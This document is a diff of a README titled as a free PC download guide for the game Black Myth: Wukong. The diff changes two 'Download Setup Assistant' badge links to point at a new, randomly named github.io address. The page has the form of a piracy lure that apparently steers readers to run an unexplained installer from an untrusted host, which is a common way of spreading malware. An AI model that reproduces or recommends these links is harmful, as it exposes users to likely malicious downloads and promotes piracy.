@@ -1,6 +1,6 @@
 # Black Myth: Wukong — PC Free Download Guide
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://black-myth-wukong-download-game.github.io/.github)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/BMW)
 
 ---
 
@@ -42,7 +42,7 @@ This guide offers a clean, efficient way to install **Black Myth: Wukong** on yo
 
 Whether you're new to action-RPGs or a seasoned player, this approach ensures a smooth installation process, complete game access, and the flexibility to play offline. Plus, the method is designed with technical accuracy and avoids unnecessary clutter during deployment.
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://black-myth-wukong-download-game.github.io/.github)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/BMW)
 
 ---
 
